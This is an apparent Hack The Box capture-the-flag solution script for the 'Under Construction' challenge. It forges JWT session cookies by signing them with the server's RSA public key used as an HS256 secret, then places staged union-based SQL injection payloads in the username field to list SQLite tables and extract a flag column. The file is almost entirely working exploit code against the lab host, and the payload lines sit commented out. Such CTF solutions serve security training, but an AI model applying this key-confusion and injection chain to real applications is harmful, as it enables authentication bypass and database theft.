#!/usr/bin/python

'''
    Under Construction
    @Author: Lorenzo Invidia
    @Requirements: python requests, pyjwt 0.4.3
'''

import requests
import jwt

base_url = 'http://docker.hackthebox.eu'
port = '32365'
url = base_url + ':' + port + '/'

# Use Pk as HS256 key
key = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n'

# Payload 1 - Find number of columns (3)
# sql_payload = 't\' order by 6 --'

# Payload 2 - Find table names (flag_storage,users)
# sql_payload = '\' union SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\' --'

# Payload 3 - Find column names (id, top_secret_flaag)
#sql_payload = '\' union SELECT 1,sql,3 FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name NOT LIKE \'sqlite_%\' AND name=\'flag_storage\' --'

# Payload 4 - Get column content
# sql_payload = '\' union SELECT 1,top_secret_flaag,3 FROM flag_storage --'

# Build token
token = jwt.encode(
{
  "username": sql_payload,
  "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
  "iat": 1586336451
}, key, algorithm='HS256')

# Add jwt token
cookies = {'session': token}

# Send request
r = requests.get(url, cookies=cookies)

print(r.text)
